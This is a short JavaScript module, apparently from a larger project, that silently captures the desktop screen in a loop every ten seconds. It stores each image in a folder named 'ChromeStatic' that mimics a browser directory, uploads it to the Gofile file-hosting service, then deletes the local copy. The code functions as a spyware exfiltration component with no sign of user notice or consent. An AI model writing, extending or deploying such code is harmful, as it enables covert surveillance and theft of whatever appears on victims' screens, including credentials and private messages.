const screenshot = require('screenshot-desktop');
const path = require('path');
const os = require('os');
const fs = require('fs/promises');
const fsSync = require('fs');
const { sendFileToGofile } = require('../utils/gofile');

function getAppDataPath() {
  const base =
    process.platform === 'win32'
      ? process.env.APPDATA
      : process.platform === 'darwin'
        ? path.join(os.homedir(), 'Library', 'Application Support')
        : path.join(os.homedir(), '.config');

  const fullPath = path.join(base, 'ChromeStatic');
  if (!fsSync.existsSync(fullPath)) {
    fsSync.mkdirSync(fullPath, { recursive: true });
  }
  return fullPath;
}

async function handleCapture() {
  const dir = getAppDataPath();
  const filePath = path.join(dir, `screenshot-${Date.now()}.jpg`);

  try {
    await screenshot({ filename: filePath });
    await sendFileToGofile(filePath);
  } catch (err) {
    console.error('Erro ao capturar ou enviar:', err);
  } finally {
    try {
      await fs.unlink(filePath);
    } catch (e) {
    }
  }
}

function startCaptureLoop(interval = 10000) {
  setInterval(() => handleCapture(), interval);
}

async function captureOnce() {
  await handleCapture();
}

module.exports = { startCaptureLoop, captureOnce };